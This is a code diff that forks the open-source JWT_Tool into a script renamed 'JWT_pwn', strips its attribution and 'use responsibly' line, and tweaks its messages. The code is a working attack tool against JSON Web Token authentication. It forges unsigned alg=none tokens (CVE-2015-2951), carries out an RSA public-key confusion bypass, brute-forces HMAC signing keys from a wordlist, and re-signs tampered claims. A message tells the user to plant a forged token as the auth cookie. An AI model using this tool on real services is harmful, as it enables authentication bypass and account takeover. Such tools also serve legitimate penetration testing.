@@ -1,12 +1,8 @@
 #! /usr/bin/python3
 
-# JWT_Tool version 2.1 (15_10_2019)
-# Written by ticarpi, Sparrrgh, Franco Marino
-# Please use responsibly...
-# Software URL: https://github.com/ticarpi/jwt_tool
-# Web: https://www.ticarpi.com
-# Twitter: @ticarpi
-#
+# JWT_pwn version 1.0 (15_10_2019)
+# Forked from https://github.com/ticarpi/jwt_tool
+# Written by Sparrrgh & Franco Marino
 
 import sys
 import hashlib
@@ -16,9 +12,7 @@ import json
 from collections import OrderedDict
 
 def usage():
-	print("Usage: $ python jwt_tool.py <JWT> (filename for dictionary or key file)\n")
-	print("If you don't have a token, try this one:")
-	print("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po")
+	print("Usage: $ python3 JWT_pwn.py <token>\n")
 	exit(1)
 
 def check_sig(sig, contents):
@@ -50,7 +44,7 @@ def check_sig_kid(sig, contents,key_file):
 
 def crack_sig(sig, contents,num_lines,key_list):
 	found = False
-	print("[+] Testing {0} passwords".format(num_lines))
+	print("Testing {0} passwords".format(num_lines))
 	for i in key_list:
 		if(test_key(i.strip("\n"), sig, contents, headDict)):
 			found = True
@@ -71,7 +65,7 @@ def test_key(key, sig, contents, headDict):
 	elif headDict["alg"] == "HS512":
 		testHash = hmac.new(key_b,contents_b,hashlib.sha512).digest()
 	else:
-		print("Algorithm is not HMAC-SHA - cannot test with this tool.")
+		print("[!] Algorithm is not HMAC-SHA - cannot test with this tool.")
 		exit(1)
 	testSig = (base64.urlsafe_b64encode(testHash).decode('utf-8')).strip("=")
 	if testSig == sig:
@@ -110,17 +104,16 @@ def sign_token(headDict, paylDict, key, keyLength):
 	return newSig.decode('utf-8').strip("="), badSig.decode('utf-8').strip("="), newContents
 
 def check_CVE(headDict, tok2):
-	print("\nGenerating alg-stripped token...")
 	alg = "none"
 	newHead = build_head(alg, headDict)
 	CVEToken = newHead+"."+tok2+"."
-	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
+	print("\n[+] Stripped token generated")
 	print("\n{0}\n".format(CVEToken))
 
 def check_pubkey_bypass(headDict, tok2):
 	#I check if the token sent is signed asymmetrically
 	if(headDict["alg"] != "RS256" and headDict["alg"] != "RS384" and headDict["alg"] != "RS512"):
-		print("The signature is already symmetrical")
+		print("[!] The signature is already symmetrical")
 		exit(1)
 	print("\nPlease enter the Public Key filename:")
 	pubKey = input("> ")
@@ -136,7 +129,7 @@ def check_pubkey_bypass(headDict, tok2):
 			print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
 			print("\n{0}.{1}".format(newTok, newSig))
 	except FileNotFoundError:
-		print("[-] File {0} doesn't exists".format(pubKey))
+		print("[!] File {0} doesn't exist".format(pubKey))
 	
 
 def tamper_token(paylDict, headDict):
@@ -172,7 +165,7 @@ def tamper_token(paylDict, headDict):
 		elif selection == 0:
 			break
 		else:
-			print("[-] Option not valid \n")
+			print("[!] Option not valid \n")
 	print("\nToken payload values:")
 	while True:
 		i = 0
@@ -197,7 +190,7 @@ def tamper_token(paylDict, headDict):
 		elif selection == 0:
 			break
 		else:
-			print("[-] Option not valid \n")
+			print("[!] Option not valid \n")
 	print("\nToken Signing:")
 	print("[1] Sign token with known key  (symmetric)")
 	print("[2] Strip signature from token vulnerable to CVE-2015-2951")
@@ -218,7 +211,7 @@ def tamper_token(paylDict, headDict):
 		try:
 			selLength = int(input("> "))
 		except:
-			print("[-] Option not valid")
+			print("[!] Option not valid")
 			exit(1)
 		if selLength == 2:
 			keyLength = 384	
@@ -232,7 +225,6 @@ def tamper_token(paylDict, headDict):
 		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
 		exit(1)
 	elif selection == 2:
-		print("\nStripped Signature")
 		jsonDump = json.dumps(paylDict,separators=(",",":"))
 		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
 		check_CVE(headDict, tok2)
@@ -250,7 +242,7 @@ def tamper_token(paylDict, headDict):
 				key = (f.read()).strip('\n')
 				print("File loaded: {0}".format(file_name))
 		except FileNotFoundError:
-			print("[-] File {0} doesn't exists".format(file_name))
+			print("[!] File {0} doesn't exist".format(file_name))
 			exit(1)
 			
 		print("\nPlease enter the keylength:")
@@ -260,7 +252,7 @@ def tamper_token(paylDict, headDict):
 		try:
 			selLength = int(input("> "))
 		except:
-			print("[-] Option not valid")
+			print("[!] Option not valid")
 		if selLength == 2:
 			keyLength = 384	
 		elif selLength == 3:
@@ -273,25 +265,15 @@ def tamper_token(paylDict, headDict):
 		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
 		exit(1)
 	else:
-		print("[-] Option not valid")
+		print("[!] Option not valid")
 		exit(1)
 
 
 if __name__ == '__main__':
-# Print logo
-	print("\n,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
-	print("----''----''----''----''----''----''----''----''----''----'")
-	print("     ,--.,--.   ,--.,--------.,--------.             ,--.")
-	print("     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |")
-	print(",--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |")
-	print("|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |")
-	print(" `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'")
-	print(",----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
-	print("'----''----''----''----''----''----''----''----''----''----'")
-
+	print("\nJWT_pwn v1.0")
 # Only use Python3
 	if sys.version_info[0] < 3:
-		print("[-] Must be using Python 3")
+		print("[!] Must be using Python 3")
 		exit(1)
 
 # Print usage + check token validity
@@ -313,7 +295,7 @@ if __name__ == '__main__':
 		headDict = json.loads(head, object_pairs_hook=OrderedDict)
 		paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
 	except:
-		print("Oh noes! Invalid token")
+		print("[!] Invalid token")
 		exit(1)
 
 # Main menu
@@ -324,7 +306,7 @@ if __name__ == '__main__':
 	for i in paylDict:
   		print("[+] "+i+" = "+str(paylDict[i]))
 	
-	print("Options:")
+	print("\nOptions:")
 	print("1: Check CVE-2015-2951 - alg=none vulnerability ")
 	print("2: Check for Public Key bypass in RSA mode")
 	print("3: Check signature against a key (symmetric)")
@@ -350,7 +332,7 @@ if __name__ == '__main__':
 				print("File loaded: {0}".format(file_name))
 				check_sig_kid(sig, contents,f.read())
 		except FileNotFoundError as e:
-			print("[-] File {0} doesn't exists".format(file_name))
+			print("[!] File {0} doesn't exist".format(file_name))
 	elif selection == 5:
 		print("\nPlease enter the dictionary filename:")
 		file_name= input("> ")
@@ -363,10 +345,10 @@ if __name__ == '__main__':
 					key_list = [x.strip() for x in lines]
 					crack_sig(sig, contents,num_lines,key_list)
 		except FileNotFoundError as e:
-			print("[-] File {0} doesn't exists".format(file_name))
+			print("[!] File {0} doesn't exist".format(file_name))
 	elif selection == 6:
 		tamper_token(paylDict, headDict)
 	else:
-		print("[-] Option not valid")
+		print("[!] Option not valid")
 		exit(1)
 	exit(1)
